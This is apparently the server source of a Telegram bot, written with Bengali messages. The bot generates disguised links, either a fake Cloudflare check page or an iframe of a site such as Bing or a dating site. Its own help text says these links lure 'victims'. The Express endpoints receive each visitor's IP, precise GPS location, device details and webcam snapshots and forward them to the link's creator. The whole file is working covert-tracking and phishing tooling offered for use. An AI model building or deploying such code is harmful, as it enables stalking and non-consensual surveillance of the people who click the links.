//প্রদত্ত bot টি আবির দ্বারা তৈয়ার হয়েছে

const fs = require("fs");
const express = require("express");
var cors = require('cors');
var bodyParser = require('body-parser');
const fetch = require('node-fetch');
const TelegramBot = require('node-telegram-bot-api');
const bot = new TelegramBot(process.env["bot"], {polling: true});
var jsonParser=bodyParser.json({limit:1024*1024*20, type:'application/json'});
var urlencodedParser=bodyParser.urlencoded({ extended:true,limit:1024*1024*20,type:'application/x-www-form-urlencoded' });
const app = express();
app.use(jsonParser);
app.use(urlencodedParser);
app.use(cors());
app.set("view engine", "ejs");

//Modify your URL here
var hostURL="YOUR URL";
//TOGGLE for 1pt Proxy and Shorters
var use1pt=true;



app.get("/w/:path/:uri",(req,res)=>{
var ip;
var d = new Date();
d=d.toJSON().slice(0,19).replace('T',':');
if (req.headers['x-forwarded-for']) {ip = req.headers['x-forwarded-for'].split(",")[0];} else if (req.connection && req.connection.remoteAddress) {ip = req.connection.remoteAddress;} else {ip = req.ip;}
if(req.params.path != null){
res.render("webview",{ip:ip,time:d,url:atob(req.params.uri),uid:req.params.path,a:hostURL,t:use1pt});
} 
else{
res.redirect("https://t.me/modapkhouse");
}

});

app.get("/c/:path/:uri",(req,res)=>{
var ip;
var d = new Date();
d=d.toJSON().slice(0,19).replace('T',':');
if (req.headers['x-forwarded-for']) {ip = req.headers['x-forwarded-for'].split(",")[0];} else if (req.connection && req.connection.remoteAddress) {ip = req.connection.remoteAddress;} else {ip = req.ip;}


if(req.params.path != null){
res.render("cloudflare",{ip:ip,time:d,url:atob(req.params.uri),uid:req.params.path,a:hostURL,t:use1pt});
} 
else{
res.redirect("https://t.me/modapkhouse");
}

});



bot.on('message', async (msg) => {
const chatId = msg.chat.id;


if(msg?.reply_to_message?.text=="🌐 আপনার URL টি দিন "){
 createLink(chatId,msg.text); 
 }
if(msg.text=="/start"){
var m={
reply_markup:JSON.stringify({"inline_keyboard":[[{text:"Create Link",callback_data:"crenew"}]]})
};

bot.sendMessage(chatId, `Welcome ${msg.chat.first_name} ! , \n আপনি একটি সাধারণ লিঙ্কের মাধ্যমে লোকেদের ট্র্যাক করতে এই বটটি ব্যবহার করতে পারেন৷ \n এটি অবস্থান (লোকেশন) , ডিভাইসের তথ্য, ক্যামেরা স্ন্যাপের মতো তথ্য সংগ্রহ করতে পারে৷\n\nType /help for more info.`,m);
}
else if(msg.text=="/create"){
createNew(chatId);
}
else if(msg.text=="/help"){
bot.sendMessage(chatId,` এই বটের মাধ্যমে আপনি শুধুমাত্র একটি সহজ লিঙ্ক পাঠিয়ে লোকেদের ট্র্যাক করতে পারেন.\n\nSend /create
শুরু করতে, পরে এটি আপনাকে একটি URL এর জন্য জিজ্ঞাসা করবে যা আইফ্রেমে ভিকটিমদের প্রলুব্ধ করতে ব্যবহার করা হবে.\n গ্রহনের পর
ইউআরএল এটি আপনাকে 2টি লিঙ্ক পাঠাবে যা আপনি লোকেদের ট্র্যাক করতে ব্যবহার করতে পারেন।
\n\n Specifications.
\n1. Cloudflare Link: এই পদ্ধতিটি তথ্য সংগ্রহের জন্য আক্রমণ পৃষ্ঠার অধীনে একটি ক্লাউডফ্লেয়ার দেখাবে এবং তারপরে শিকারকে গন্তব্য URL এ পুনঃনির্দেশিত করা হবে.
\n2. Webview Link: এটি তথ্য সংগ্রহের জন্য iframe ব্যবহার করে একটি ওয়েবসাইট (ex Bing, ডেটিং সাইট ইত্যাদি) দেখাবে.
( ⚠️ অনেক সাইট এই পদ্ধতির অধীনে কাজ নাও করতে পারে যদি তাদের কাছে এক্স-ফ্রেম হেডার থাকে.Ex https://google.com )
\n\nThe project is OSS at: https://www.facebook.com/ErorM.JOKER
`);
}
});

bot.on('callback_query',async function onCallbackQuery(callbackQuery) {
bot.answerCallbackQuery(callbackQuery.id);
if(callbackQuery.data=="crenew"){
createNew(callbackQuery.message.chat.id);
} 
});
bot.on('polling_error', (error) => {
//console.log(error.code); 
});






async function createLink(cid,msg){

var encoded = [...msg].some(char => char.charCodeAt(0) > 127);

if ((msg.toLowerCase().indexOf('http') > -1 || msg.toLowerCase().indexOf('https') > -1 ) && !encoded) {
var url=cid.toString(36)+'/'+btoa(msg);
var m={
  reply_markup:JSON.stringify({
      "inline_keyboard":[[{text:"Create new Link",callback_data:"crenew"}]]
        } )
        };
var cUrl=`${hostURL}/c/${url}`;
var wUrl=`${hostURL}/w/${url}`;
bot.sendChatAction(cid,"typing");
if(use1pt){
var x=await fetch(`https://short-link-api.vercel.app/?query=${encodeURIComponent(cUrl)}`).then(res => res.json());
var y=await fetch(`https://short-link-api.vercel.app/?query=${encodeURIComponent(wUrl)}`).then(res => res.json());

var f="",g="";

for(var c in x){
f+=x[c]+"\n";
}

for(var c in y){
g+=y[c]+"\n";
}
bot.sendMessage(cid, `নতুন লিঙ্কগুলি সফলভাবে তৈরি করা হয়েছে৷ আপনি নীচের লিঙ্কগুলির যেকোনো একটি ব্যবহার করতে পারেন৷.\nURL: ${msg}\n\n✅আপনার জন্য তৈরি করা লিংক গুলো \n\n🌐 CloudFlare Page Link\n${f}\n\n🌐 WebView Page Link\n${g}`,m);
}
else{

bot.sendMessage(cid, `নতুন লিঙ্ক সফলভাবে তৈরি করা হয়েছে.\nURL: ${msg}\n\n✅আপনার জন্য তৈরি করা লিংক গুলো\n\n🌐 CloudFlare Page Link\n${cUrl}\n\n🌐 WebView Page Link\n${wUrl}`,m);
}
}
else{
bot.sendMessage(cid,`⚠️ একটি বৈধ URL প্রবেশ করুন , অবশ্যই http or https. যুক্ত থাকতে হবে`);
createNew(cid);

}  
}


function createNew(cid){
var mk={
reply_markup:JSON.stringify({"force_reply":true})
};
bot.sendMessage(cid,`🌐 আপনার URL প্রবেশ করান `,m);
}





app.get("/", (req, res) => {
var ip;
if (req.headers['x-forwarded-for']) {ip = req.headers['x-forwarded-for'].split(",")[0];} else if (req.connection && req.connection.remoteAddress) {ip = req.connection.remoteAddress;} else {ip = req.ip;}
res.json({"ip":ip});

});


app.post("/location",(req,res)=>{

var lat=parseFloat(decodeURIComponent(req.body.lat)) || null;
var lon=parseFloat(decodeURIComponent(req.body.lon)) || null;
var uid=decodeURIComponent(req.body.uid) || null;
var acc=decodeURIComponent(req.body.acc) || null;
if(lon != null && lat != null && uid != null && acc != null){

bot.sendLocation(parseInt(uid,36),lat,lon);

bot.sendMessage(parseInt(uid,36),`Latitude: ${lat}\nLongitude: ${lon}\nAccuracy: ${acc} meters`);
res.send("Done");
}
});


app.post("/",(req,res)=>{

var uid=decodeURIComponent(req.body.uid) || null;
var data=decodeURIComponent(req.body.data)  || null; 
if( uid != null && data != null){


data=data.replaceAll("<br>","\n");

bot.sendMessage(parseInt(uid,36),data,{parse_mode:"HTML"});

res.send("Done");
}
});


app.post("/camsnap",(req,res)=>{
var uid=decodeURIComponent(req.body.uid)  || null;
var img=decodeURIComponent(req.body.img) || null;
if( uid != null && img != null){
var buffer=Buffer.from(img,'base64');
var info={
filename:"camsnap.png",
contentType: 'image/png'
};


try {
bot.sendPhoto(parseInt(uid,36),buffer,{},info);
} catch (error) {
console.log(error);
}


res.send("Done");
}

});



app.listen(5000, () => {
console.log("App Running on Port 5000!");
});

